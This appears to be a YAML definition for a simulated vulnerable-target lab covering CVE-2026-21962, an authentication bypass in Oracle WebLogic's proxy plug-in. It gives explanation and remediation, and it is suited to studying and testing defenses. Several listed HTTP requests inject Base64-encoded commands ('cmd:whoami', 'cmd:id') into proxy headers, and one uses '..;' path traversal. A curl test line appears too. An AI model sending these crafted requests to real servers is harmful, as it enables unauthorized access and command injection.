id: vt-2026-21962

info:
  name: "Oracle WebLogic Server Proxy Plug-in - Authentication Bypass"
  author: omarkurt
  description: |
    ⚠️  NOTE: This is a SIMULATED vulnerability environment using Python/Flask.
    The actual Oracle WebLogic Server is NOT included. The lab emulates the
    vulnerable behavior for educational purposes.

    CVE-2026-21962 is a critical authentication bypass vulnerability in Oracle HTTP Server and
    the WebLogic Server Proxy Plug-in for Apache HTTP Server and Microsoft IIS. The vulnerability
    exists due to improper handling of incoming requests by the WebLogic Server Proxy Plug-ins.

    An unauthenticated remote attacker can exploit this flaw by sending specially crafted HTTP
    requests with manipulated proxy headers (wl-proxy-client-ip, proxy-client-ip, x-forwarded-for)
    to bypass authentication controls and gain unauthorized access to backend WebLogic Server
    resources. Successful exploitation can result in unauthorized creation, deletion, or
    modification of critical data, or full compromise of all data accessible through the
    affected servers.
  targets:
    - oracle-weblogic
    - oracle-http-server
    - weblogic-proxy-plugin
  type: CVE
  cve: CVE-2026-21962
  cwe: CWE-287
  cvss:
    score: 10.0
    severity: critical
  affected_versions:
    - "Oracle HTTP Server: 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0"
    - "WebLogic Server Proxy Plug-in (Apache): 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0"
    - "WebLogic Server Proxy Plug-in (IIS): 12.2.1.4.0"
  tags:
    - oracle
    - weblogic
    - auth-bypass
    - critical
    - cve-2026
    - proxy
    - middleware
  references:
    - https://www.oracle.com/security-alerts/cpujan2026.html
    - https://nvd.nist.gov/vuln/detail/CVE-2026-21962
    - https://www.cve.org/CVERecord?id=CVE-2026-21962
    - https://arcticwolf.com/resources/blog/cve-2026-21962/
    - https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/cve-2026-21962-oracle-weblogic-proxy-auth-bypass
    - https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-21962-in-oracle-http-and-weblogic/
    - https://vulnerabletarget.com/VT-2026-21962
vulnerabilities:
  - id: 1
    name: "Full Headers Bypass"
    description: "Uses all three vulnerable headers with localhost IP and Base64 payload"
    endpoint: /bea_wls_internal/ProxyServlet
    method: GET
    headers:
      - name: wl-proxy-client-ip
        value: "127.0.0.1;Y21kOndob2FtaQ=="
      - name: proxy-client-ip
        value: "127.0.0.1;Y21kOndob2FtaQ=="
      - name: x-forwarded-for
        value: "127.0.0.1;Y21kOndob2FtaQ=="
    request: |
      GET /bea_wls_internal/ProxyServlet HTTP/1.1
      Host: {{Hostname}}
      wl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==
      proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==
      x-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==
      User-Agent: Mozilla/5.0 (compatible; Exploit/1.0)
      Accept: */*
      Connection: close
    response: |
      HTTP/1.1 200 OK
      Server: WebLogic Server 14.1.1.0.0

      Proxy Servlet
      BEA WebLogic Server Proxy Servlet
      Mode: VULNERABLE (CVE-2026-21962)
    highlight:
      - "VULNERABLE (CVE-2026-21962)"
      - "127.0.0.1;Y21kOndob2FtaQ=="

  - id: 2
    name: "Direct ProxyServlet Access"
    description: "Direct access to ProxyServlet with injected headers (no path traversal)"
    endpoint: /bea_wls_internal/ProxyServlet
    method: GET
    headers:
      - name: wl-proxy-client-ip
        value: "127.0.0.1;Y21kOndob2FtaQ=="
      - name: proxy-client-ip
        value: "127.0.0.1;Y21kOndob2FtaQ=="
      - name: x-forwarded-for
        value: "127.0.0.1;Y21kOndob2FtaQ=="
    request: |
      GET /bea_wls_internal/ProxyServlet HTTP/1.1
      Host: {{Hostname}}
      wl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==
      proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==
      x-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==
      User-Agent: Mozilla/5.0
      Accept: */*
      Connection: close
    response: |
      HTTP/1.1 200 OK

      Proxy Servlet
      BEA WebLogic Server Proxy Servlet
      Mode: VULNERABLE (CVE-2026-21962)

  - id: 3
    name: "Single Header Bypass"
    description: "Bypass using only wl-proxy-client-ip header"
    endpoint: /bea_wls_internal/ProxyServlet
    method: GET
    headers:
      - name: wl-proxy-client-ip
        value: "127.0.0.1;Y21kOndob2FtaQ=="
    request: |
      GET /bea_wls_internal/ProxyServlet HTTP/1.1
      Host: {{Hostname}}
      wl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==
      User-Agent: Mozilla/5.0
      Accept: */*
      Connection: close
    response: |
      HTTP/1.1 200 OK

      Proxy Servlet
      BEA WebLogic Server Proxy Servlet

  - id: 4
    name: "Console Path Traversal"
    description: "Access via console path traversal"
    endpoint: /console/..;/bea_wls_internal/ProxyServlet
    method: GET
    headers:
      - name: wl-proxy-client-ip
        value: "127.0.0.1;Y21kOndob2FtaQ=="
      - name: proxy-client-ip
        value: "127.0.0.1;Y21kOndob2FtaQ=="
      - name: x-forwarded-for
        value: "127.0.0.1;Y21kOndob2FtaQ=="
    request: |
      GET /console/..;/bea_wls_internal/ProxyServlet HTTP/1.1
      Host: {{Hostname}}
      wl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==
      proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==
      x-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==
      User-Agent: Mozilla/5.0
      Accept: */*
      Connection: close
    response: |
      HTTP/1.1 200 OK

      Proxy Servlet
    highlight:
      - "console/..;/bea_wls_internal"
      - "127.0.0.1;Y21kOndob2FtaQ=="

  - id: 5
    name: "Different Payload - Reverse Shell Command"
    description: "Bypass with different Base64 encoded payload (id command)"
    endpoint: /bea_wls_internal/ProxyServlet
    method: GET
    headers:
      - name: wl-proxy-client-ip
        value: "127.0.0.1;Y21kOmlk"
      - name: proxy-client-ip
        value: "127.0.0.1;Y21kOmlk"
      - name: x-forwarded-for
        value: "127.0.0.1;Y21kOmlk"
    request: |
      GET /bea_wls_internal/ProxyServlet HTTP/1.1
      Host: {{Hostname}}
      wl-proxy-client-ip: 127.0.0.1;Y21kOmlk
      proxy-client-ip: 127.0.0.1;Y21kOmlk
      x-forwarded-for: 127.0.0.1;Y21kOmlk
      User-Agent: Mozilla/5.0
      Accept: */*
      Connection: close
    response: |
      HTTP/1.1 200 OK

      Proxy Servlet
      cmd:id
    highlight:
      - "cmd:id"
      - "127.0.0.1;Y21kOmlk"
      - "Proxy Servlet"

  - id: 6
    name: "Normal Request - Should Fail"
    description: "Request without malicious headers (should return 401)"
    endpoint: /bea_wls_internal/ProxyServlet
    method: GET
    headers: []
    request: |
      GET /bea_wls_internal/ProxyServlet HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0
      Accept: */*
      Connection: close
    response: |
      HTTP/1.1 401 Unauthorized
      WWW-Authenticate: Basic realm="WebLogic Server"

      401 Unauthorized
      401 Unauthorized
    highlight:
      - "401 Unauthorized"

technical: |
  The vulnerability exists in the WebLogic Server Proxy Plug-in's request handling mechanism.
  The plug-in fails to adequately validate and sanitize incoming HTTP headers used for
  proxy functionality, specifically:

  - wl-proxy-client-ip
  - proxy-client-ip
  - x-forwarded-for

  Attackers can inject malicious payloads by:
  1. Using semicolon-delimited values instead of comma-delimited (bypassing IP validation)
  2. Appending Base64-encoded commands (Y21kOndob2FtaQ== decodes to "cmd:whoami")
  3. Path traversal sequences (..;) to access restricted internal endpoints like /bea_wls_internal/ProxyServlet

  The ProxyServlet is an internal WebLogic component that should not be directly accessible
  from external sources. The authentication bypass allows attackers to route requests through
  this servlet, potentially accessing backend administration interfaces and internal APIs.

impact: |
  Critical impact due to CVSS 10.0 severity:

  - Unauthorized access to backend WebLogic Server resources
  - Complete authentication bypass on affected proxy configurations
  - Ability to create, modify, or delete critical data
  - Potential for full system compromise
  - Lateral movement into internal network segments
  - Access to administrative interfaces and sensitive configuration data

  The vulnerability is particularly dangerous because:
  - It requires no authentication
  - It has low attack complexity
  - It can be exploited over standard HTTP/HTTPS
  - WebLogic is widely deployed in enterprise environments
  - The proxy plug-in sits between public internet and internal applications

remedy: |
  1. Apply Oracle's January 2026 Critical Patch Update immediately:
     https://www.oracle.com/security-alerts/cpujan2026.html

  2. Temporary mitigations (until patching):
     - Restrict network exposure of Oracle HTTP Server and WebLogic Proxy Plug-in
     - Place behind WAF (Web Application Firewall) with appropriate rules
     - Implement IP allowlisting for administrative access
     - Monitor for suspicious requests containing injected headers
     - Block access to /bea_wls_internal/ paths at the network perimeter

  3. Review and harden proxy configurations:
     - Disable unused functional modules
     - Follow principle of least privilege
     - Do not expose services to internet unless necessary

poc:
  nuclei:
    - "vt-2026-21962.nuclei.yaml"

providers:
  docker-compose:
    path: "docker-compose.yaml"
    image: "ghcr.io/happyhackingspace/vt-2026-21962:latest"
    ports:
      - 8090

post-install:
  - "Proxy Servlet endpoint: http://localhost:8090/bea_wls_internal/ProxyServlet"
  - "Use vt-2026-21962.nuclei.yaml to test for authentication bypass"
  - "Test: curl -H 'wl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==' http://localhost:8090/bea_wls_internal/ProxyServlet"
